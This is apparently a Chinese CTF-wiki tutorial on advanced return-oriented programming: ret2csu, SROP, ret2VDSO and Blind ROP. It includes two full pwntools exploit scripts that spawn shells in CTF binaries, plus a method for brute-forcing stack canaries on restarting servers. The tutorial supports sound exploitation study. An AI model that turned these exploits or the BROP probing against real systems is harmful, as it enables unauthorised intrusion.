# 高级ROP

高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些比较有意思的gadgets。

# ret2__libc_scu_init

## 原理

在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

这里我们可以利用以下几点

- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。
- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。
- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。

## 示例

这里我们以蒸米的一步一步学ROP之linux_x64篇中level5为例进行介绍。首先检查程序的安全保护

```shell
➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5   
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序为64位，开启了堆栈不可执行保护。

其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出

```C
ssize_t vulnerable_function()
{
  char buf; // [sp+0h] [bp-80h]@1

  return read(0, &buf, 0x200uLL);
}
```

简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。

**注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。**

基本利用思路如下

- 利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数
- 根据libcsearcher获取对应libc版本以及execve函数地址
- 再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。
- 再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。

exp如下

```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
# RDI, RSI, RDX, RCX, R8, R9, more on the stack
# write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
#gdb.attach(sh)

# read(0,bss_base,16)
# read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
# execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

## 思考

### 改进

在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法

#### 改进1-提前控制rbx与rbp

可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少16字节，即我们所需的字节数只需要112。

#### 改进2-多次利用

其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件

- 漏洞可以被多次触发
- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。

**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**

### gadget

其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数

```text
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```

我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。

需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器

- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
- 利用中间部分的代码控制了rdx，rsi，edi。

而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，**可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。**而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。

```assembly
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:	pop    rbx
   0x40061b <__libc_csu_init+91>:	pop    rbp
   0x40061c <__libc_csu_init+92>:	pop    r12
   0x40061e <__libc_csu_init+94>:	pop    r13
   0x400620 <__libc_csu_init+96>:	pop    r14
gef➤  x/5i 0x000000000040061b
   0x40061b <__libc_csu_init+91>:	pop    rbp
   0x40061c <__libc_csu_init+92>:	pop    r12
   0x40061e <__libc_csu_init+94>:	pop    r13
   0x400620 <__libc_csu_init+96>:	pop    r14
   0x400622 <__libc_csu_init+98>:	pop    r15
gef➤  x/5i 0x000000000040061A+3
   0x40061d <__libc_csu_init+93>:	pop    rsp
   0x40061e <__libc_csu_init+94>:	pop    r13
   0x400620 <__libc_csu_init+96>:	pop    r14
   0x400622 <__libc_csu_init+98>:	pop    r15
   0x400624 <__libc_csu_init+100>:	ret 
gef➤  x/5i 0x000000000040061e
   0x40061e <__libc_csu_init+94>:	pop    r13
   0x400620 <__libc_csu_init+96>:	pop    r14
   0x400622 <__libc_csu_init+98>:	pop    r15
   0x400624 <__libc_csu_init+100>:	ret    
   0x400625:	nop
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:	pop    rbp
   0x400620 <__libc_csu_init+96>:	pop    r14
   0x400622 <__libc_csu_init+98>:	pop    r15
   0x400624 <__libc_csu_init+100>:	ret    
   0x400625:	nop
gef➤  x/5i 0x0000000000400620
   0x400620 <__libc_csu_init+96>:	pop    r14
   0x400622 <__libc_csu_init+98>:	pop    r15
   0x400624 <__libc_csu_init+100>:	ret    
   0x400625:	nop
   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:	pop    rsi
   0x400622 <__libc_csu_init+98>:	pop    r15
   0x400624 <__libc_csu_init+100>:	ret    
   0x400625:	nop
gef➤  x/5i 0x000000000040061A+9
   0x400623 <__libc_csu_init+99>:	pop    rdi
   0x400624 <__libc_csu_init+100>:	ret    
   0x400625:	nop
   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:	repz ret 
```

## 题目

- 2016 XDCTF pwn100
- 2016 华山杯 SU_PWN

参考阅读

- http://wooyun.jozxing.cc/static/drops/papers-7551.html
- http://wooyun.jozxing.cc/static/drops/binary-10638.html

# ret2_dl_runtime_resolve

参见http://wooyun.jozxing.cc/static/drops/binary-10638.html

注意：

- 可以控制6个寄存器rdi，rsi，rdx，rcx， r8，r9 
- 需要控制rax寄存器的值
- 可能被avx向量化

# ret2reg

## 原理

1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
2. 然后反编译二进制，查找call reg 或者jmp reg指令，将 EIP设置为该指令地址
3. reg所指向的空间上注入Shellcode(需要确保该空间是可以执行的，但通常都是栈上的)

# SROP

## 基本介绍

SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究**`Framing Signals — A Return to Portable Shellcode`**发表在安全顶级会议[Oakland 2014](http://www.ieee-security.org/TC/SP2014)上，被评选为当年的[Best Student Papers](http://www.ieee-security.org/TC/SP2014/awards.html)。其中相关的paper以及slides的链接如下：

[paper](http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf)

[slides](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

其中，`sigreturn`是一个系统调用，在类unix系统发生signal的时候会被间接地调用。

## signal机制

 signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：

![Process of Signal Handlering](/pwn/stackoverflow/figure/ProcessOfSignalHandlering.png)

1. 内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。

2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址**。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal Frame。**需要注意的是，这一部分是在用户进程的地址空间的。**之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。

   ![signal2-stack](/pwn/stackoverflow/figure/signal2-stack.png)

   对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext

   - x86

   ```C
   struct sigcontext
   {
     unsigned short gs, __gsh;
     unsigned short fs, __fsh;
     unsigned short es, __esh;
     unsigned short ds, __dsh;
     unsigned long edi;
     unsigned long esi;
     unsigned long ebp;
     unsigned long esp;
     unsigned long ebx;
     unsigned long edx;
     unsigned long ecx;
     unsigned long eax;
     unsigned long trapno;
     unsigned long err;
     unsigned long eip;
     unsigned short cs, __csh;
     unsigned long eflags;
     unsigned long esp_at_signal;
     unsigned short ss, __ssh;
     struct _fpstate * fpstate;
     unsigned long oldmask;
     unsigned long cr2;
   };
   ```

   - x64

   ```C
   struct _fpstate
   {
     /* FPU environment matching the 64-bit FXSAVE layout.  */
     __uint16_t		cwd;
     __uint16_t		swd;
     __uint16_t		ftw;
     __uint16_t		fop;
     __uint64_t		rip;
     __uint64_t		rdp;
     __uint32_t		mxcsr;
     __uint32_t		mxcr_mask;
     struct _fpxreg	_st[8];
     struct _xmmreg	_xmm[16];
     __uint32_t		padding[24];
   };

   struct sigcontext
   {
     __uint64_t r8;
     __uint64_t r9;
     __uint64_t r10;
     __uint64_t r11;
     __uint64_t r12;
     __uint64_t r13;
     __uint64_t r14;
     __uint64_t r15;
     __uint64_t rdi;
     __uint64_t rsi;
     __uint64_t rbp;
     __uint64_t rbx;
     __uint64_t rdx;
     __uint64_t rax;
     __uint64_t rcx;
     __uint64_t rsp;
     __uint64_t rip;
     __uint64_t eflags;
     unsigned short cs;
     unsigned short gs;
     unsigned short fs;
     unsigned short __pad0;
     __uint64_t err;
     __uint64_t trapno;
     __uint64_t oldmask;
     __uint64_t cr2;
     __extension__ union
       {
         struct _fpstate * fpstate;
         __uint64_t __fpstate_word;
       };
     __uint64_t __reserved1 [8];
   };
   ```

   ​


1. signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。

## 攻击原理

仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：

- Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。
- 由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。

说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。

### 获取shell

首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息

![signal2-stack](/pwn/stackoverflow/figure/srop-example-1.png)

当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。

### system call chains

需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可

- **控制栈指针。**
- **把原来rip指向的`syscall` gadget换成`syscall; ret` gadget。**

如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。

![signal2-stack](/pwn/stackoverflow/figure/srop-example-2.png)

### 后续

需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件

- **可以通过栈溢出来控制栈的内容**
- **需要知道相应的地址**
  - **"/bin/sh"**
  - **Signal Frame**
  - **syscal**
  - **sigreturn**
- 需要有够大的空间来塞下整个sigal frame

此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：

![gadget1](/pwn/stackoverflow/figure/srop-gadget-1.png)

并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说`Linux < 3.3 x86_64`（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&return代码片段。如下

![gadget1](/pwn/stackoverflow/figure/srop-gadget-2.png)

但是目前它已经被`vsyscall-emulate`和`vdso`机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。

值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。

## 利用工具

**值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**

## 攻击实例

这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下

**确定文件基本信息**

```text
➜  smallest file smallest     
smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

可以看到该程序为64位静态链接版本。

**检查保护**

```text
➜  smallest checksec smallest     
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序主要开启了NX保护。

**漏洞发现**

实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下

```asm
public start
start proc near
xor     rax, rax
mov     edx, 400h
mov     rsi, rsp
mov     rdi, rax
syscall
retn
start endp
```

根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。

**利用思路**

由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下

- 通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn
- 通过syscall执行execve("/bin/sh",0,0)来获取shell。

**漏洞利用程序**

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
# set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)

# modify the return addr to start_addr+3
# so that skip the xor rax,rax; then the rax=1
# get stack addr
sh.send('\xb3')
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))

# make the rsp point to stack_addr
# the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)

# set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)

# call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
```

其基本流程为

- 读取三个程序起始地址
- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1
- 那么此时将会执行write(1,$esp,0x400)，泄露栈地址。
- 利用第三个程序起始地址进而读入payload
- 再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve('/bin/sh',0,0)
- 再次读取构造sigreturn调用，从而获取shell。

## 题目

- [Defcon 2015 Qualifier: fuckup](https://brant-ruan.github.io/resources/Binary/learnPwn/fuckup_56f604b0ea918206dcb332339a819344)

参考阅读

- [Sigreturn Oriented Programming (SROP) Attack攻击原理](http://www.freebuf.com/articles/network/87447.html)
- [SROP by Angle Baby](https://www.slideshare.net/AngelBoy1/sigreturn-ori)
- [系统调用](http://www.cs.utexas.edu/~bismith/test/syscalls/syscalls64_orig.html)

# ret2VDSO

## VDSO介绍

什么是VDSO(Virtual Dynamically-linked Shared Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一直，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int 0x80来进行系统调用，不同的处理器实现了不同的快速系统调用指令

- intel实现了sysenter，sysexit
- amd实现了syscall，sysret

当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。

这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:

```shell
➜  ~ ldd /bin/sh           
	linux-vdso.so.1 =>  (0x00007ffd8ebf2000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
	/lib64/ld-linux-x86-64.so.2 (0x0000560cae6eb000)
```

除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。

这里我们以intel的处理器为例，进行简单说明。

其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）

```assembly
push ebp
mov ebp,esp
```

此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。

## 原理

待补充。	

## 题目

- **Defcon 2015 Qualifier fuckup**

参考

- http://man7.org/linux/man-pages/man7/vdso.7.html
- http://adam8157.info/blog/2011/10/linux-vdso/

# BROP

## 基本介绍

BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**，下面是作者对应的paper和slides,以及作者相应的介绍

- [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
- [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)

BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。

## 攻击条件

1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。

## 攻击原理

目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。

### 基本思路

在BROP中，基本的遵循的思路如下

- 判断栈溢出字符串长度
  - 暴力枚举
- Stack Reading
  - 获取栈上的数据来泄露canaries，以及ebp和返回地址。
- Bind ROP
  - 找到足够多的gadgets来控制输出函数的参数，并且对其进行调用，比如说常见的write函数以及puts函数。
- Build the exploit
  - 利用输出函数来dump出程序以便于来找到更多的gadgets，从而可以写出最后的exploit。

### 栈溢出长度

直接从1暴力枚举即可，直到发现程序崩溃。

### Stack Reading

如下所示，这是目前经典的栈布局

```
buffer|canary|saved fame pointer|saved returned address
```

要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。

其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。

canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。

需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。

![](/pwn/stackoverflow/figure/stack_reading.png)

### Blind ROP

#### 基本思路

最朴素的执行write函数的方法就是构造系统调用。

```assembly
pop rdi; ret # socket
pop rsi; ret # buffer
pop rdx; ret # length
pop rax; ret # write syscall number
syscall
```

但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。

##### BROP gadgets

首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的

![](/pwn/stackoverflow/figure/brop_gadget.png)

##### find a call write 

我们可以通过plt表来获取write的地址。

##### control rdx

需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序

```assembly
pop rdx; ret
```

这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。

那么接下来的问题，我们就可以分为两项

- 寻找gadgets
- 寻找PLT表
  - write入口
  - strcmp入口

#### 寻找gadgets

首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况

- 程序直接崩溃
- 程序运行一段时间后崩溃
- 程序一直运行而并不崩溃

为了寻找合理的gadgets，我们可以分为以下两步

##### 寻找stop gadgets

所谓`stop gadget`**一般**指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。

> 其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。

之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的`useful gadget`，从而放弃它。例子如下图

![](/pwn/stackoverflow/figure/stop_gadget.png)

但是，如果我们布置了`stop gadget`，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。

##### 识别 gadgets

那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址

- **Probe**
  - 探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
- **Stop**
  - 不会使得程序崩溃的stop gadget的地址。
- **Trap**
  - 可以导致程序崩溃的地址

我们可以通过在栈上摆放不同顺序的**Stop**与 **Trap**从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子

- probe,stop,traps(traps,traps,...)
  - 我们通过程序崩溃与否(**如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如
    - ret
    - xor eax,eax; ret
- probe,trap,stop,traps
  - 我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如
    - pop rax; ret
    - pop rdi; ret
- probe, trap, trap, trap, trap, trap, trap, stop, traps
  - 我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop gadget相似的gadget。**这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方
    - plt处不会崩，，
    - _start处不会崩，相当于程序重新执行。

之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。

但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。

但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成

- pop rsp

等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。



**此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。**



**需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思**

#### 寻找PLT

如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。 

![](/pwn/stackoverflow/figure/brop_plt.png)

此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。

#### 控制rdx

当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。

之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址

- readable，可读的地址。
- bad, 非法地址，不可访问，比如说0x0。

那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况

- strcmp(bad,bad)
- strcmp(bad,readable)
- strcmp(readable,bad)
- strcmp(readable,readable)

